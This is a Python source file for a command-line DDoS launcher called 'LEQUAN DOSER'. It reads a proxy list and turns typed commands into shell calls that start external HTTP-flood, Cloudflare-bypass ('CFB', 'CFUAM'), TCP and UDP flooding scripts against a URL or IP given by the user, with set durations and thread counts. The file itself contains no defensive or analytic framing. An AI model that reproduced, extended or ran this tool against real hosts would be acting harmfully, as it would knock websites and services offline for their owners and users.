from colorama import Fore, Back, Style
import socket
import os
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.BLUE + """LeQuan""")
    time.sleep(1.8)
    clear()

def si():
    print("Zalo/Call: 0345769091")
    print("Information: https://lequan0410.github.io/")

def menu():
    sys.stdout.write(f"DOSER")
    clear()
    print('DOSER DDoS By LeQuan')
    print("https://lequan0410.github.io/")
    print(Fore.YELLOW + """LEQUAN DOSER""")

def main():
    menu()
    while(True):
        cnc = input('''Input :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-proxy" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                bot = cnc.split()[3]
                os.system(f'node httpproxy.js {url} {time} {bot} proxy')
            except IndexError:
                print(Fore.RED +'Usage: http-proxy <url> <time> <bot>')
                print(Fore.RED +'Example: http-proxy https://lequan0410.github.io/ 100 5')

        elif "http-flood" in cnc:
            try:
                url = cnc.split()[1]
                data = cnc.split()[2]
                os.system(f'go run httpflood.go -site {url} -data {data}')
            except IndexError:
                print(Fore.RED +'Usage: http-flood <url> <data>')
                print(Fore.RED +'Example: http-flood https://lequan0410.github.io/ get')

        elif "http-cfb" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python http.py CFB {url} 5 1000 proxy.txt 9999 {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-cfb <url> <time>')
                print(Fore.RED +'Example: http-cfb https://lequan0410.github.io/ 60')

        elif "tcp" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python http.py TCP {ip} 1000 {time}')
            except IndexError:
                print(Fore.RED +'Usage: tcp <ip:port><time>')
                print(Fore.RED +'Example: tcp 1.1.1.1:80  60')

        elif "http-uam" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python http.py CFUAM {url} 5 1000 proxy.txt 9999 {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-uam <url> <time>')
                print(Fore.RED +'Example: http-uam https://lequan0410.github.io/ 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python http.py UDP {ip} 1000 {time}')
            except IndexError:
                print(Fore.RED +'Usage: udp <url> <time>')
                print(Fore.RED +'Example: udp https://lequan0410.github.io/ 60')

        elif "info" in cnc:
            print(f'''
[https://lequan0410.github.io/]

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
main()